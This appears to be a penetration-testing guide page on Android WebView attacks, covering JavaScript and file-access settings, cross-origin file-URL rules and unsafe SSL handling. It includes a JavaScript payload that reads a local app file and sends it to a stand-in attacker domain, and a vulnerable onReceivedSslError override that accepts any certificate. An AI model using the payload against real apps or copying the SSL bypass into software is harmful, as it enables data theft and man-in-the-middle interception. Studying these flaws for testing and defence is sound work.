# Webview Attacks

## Javascript Enabled

_WebViews_ have _Javascript_ disabled by default. The method [_setJavaScriptEnabled\(\)_](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled%28boolean%29) is available for explicitly enabling or disabling it.

## File Access

_WebView_ file access is enabled by default. Since API 3 \(Cupcake 1.5\) the method [_setAllowFileAccess\(\)_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess%28boolean%29) is available for explicitly enabling or disabling it.

If the application has _android.permission.READ\_EXTERNAL\_STORAGE_ it will be able to read and load files from the external storage.

 The _WebView_ needs to use a File URL Scheme, e.g., `file://path/file`, to access the file.

## CORS - Cross Origin Resource Sharing

**If you want to**[ **learn what is CORS please read this post**](../../pentesting-web/cors-bypass.md)**.**

There is a very important property called _**UniversalAccessFromFileURLs**_ **that allows SOP bypass**. This property indicates whether _Javascript_ running in the context of a file scheme can **access content from any origin**. This property is enabled by default below API 16 \(Jelly Bean 4.1.x\) and there is no way to disable it on those API levels \[[1](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html#note1)\]. In API 16 \(Jelly Bean 4.1.x\) and afterwards the property is **disabled by default**. The method [_**setAllowUniversalAccessFromFileURLs\(\)**_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowUniversalAccessFromFileURLs%28boolean%29) ****was also made available to explicitly **enable or disable this feature**.

## Scenarios

### Javascript Enabled & FileSystemAccess Disabled

In this scenario an attacker is able to **inject Javascript code** inside the web page opened via **webview** by the victim. This could be done maybe via **XSS** or making the webview **load** a **malicious HTML** page stored inside the phone.  
This **webview has Javascript enabled** but no access to the file system.

In this scenario the attacker **won't be able to read local files**, but depending on the permissions of the application this **could allow an attacker to interact with the functionality of the device** \(read SMS, microphone recording etc.\) exposing the security of the application and the device itself into great risk.

### Javascript Enabled & FileSystemAccess enabled

The scenario is like the one mentioned previously but the **webview now have FileSystem access**.  
An attacker could try to ex-filtrate files with javascript code like:

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
    window.location.replace('https://attackerdomain.com/?exfiltrated='+xhr.responseText);
    }
}
xhr.open('GET', 'file:///data/data/pt.integrity.labs.webview_remote/files/sandbox_file.txt', true);
xhr.send(null);
```

So **even with file access enabled** in the _WebView_, due to the fact that the file scheme request is considered a **Cross Origin Request** and hence **disallowed**, the attacker will **not be able to exfiltrate** files this way.

Note that if the **attacker is able to control the mobile** where the vulnerable application is running, he could be able to abuse it to **make it load the internal file and see it**. In this case the CORS isn't stopping the attack because the attacker is **directly accessing the file instead of trying to access it from a different origin**. 

**CORS related errors looks like this:**

```javascript
05-09 12:38:59.306 27768 27768 I chromium: [INFO:CONSOLE(20)] “Failed to load file:///data/data/pt.integrity.labs.webview_remote/files/sandbox_file.txt: Cross origin requests are only supported for protocol schemes: http, data, chrome, https.”, source: https://labs.integrity.pt/ (20)
```

### Javascript Enabled, FileSystemAccessEnabled & CORS Disabled

In this scenario, using the same Javascript payload, you will finally **be able to ex-filtrate internal files.**

## **SSL Error Handling**

The code below instructs the WebView client to **proceed when an SSL error occur**. This means that the **application is vulnerable to MiTM attacks** as it could allow an attacker to read or modify content that is displayed to the user since any certificate would be accepted by the application.

```javascript
@Override
public void onReceivedSslError(WebView view, SslErrorHandler handler,
SslError error)
{
    handler.proceed();
}
```

## **References**

* \*\*\*\*[**https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html**](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)\*\*\*\*
* \*\*\*\*[**https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/**](https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/)\*\*\*\*

